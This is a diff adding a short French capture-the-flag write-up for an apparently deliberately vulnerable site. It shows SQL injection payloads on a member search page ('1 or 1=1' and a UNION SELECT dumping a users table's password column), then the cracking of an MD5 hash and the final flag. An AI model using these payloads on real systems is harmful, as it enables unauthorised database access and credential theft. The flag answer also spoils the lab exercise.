@@ -1,0 +1,13 @@
+Sur la page de recherche de membres "Search Member", il y a une injection SQL.
+Tout d'abord, on peut afficher tous les usrs en ecrivant : "1 or 1=1"
+
+Apres plusieurs essais en vain, la plus intéressante est :"1 or 1=1 UNION SELECT Commentaire, countersign FROM users"
+on obtient une consigne  a la fin qui nous invite a :
+
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+5ff9d0165b4f92b14994e5c685cdce28
+5ff9d0165b4f92b14994e5c685cdce28 (md5->plain text) FortyTwo
+
+fortytwo (ascii->sha256) 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+Le flag est donc : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5.
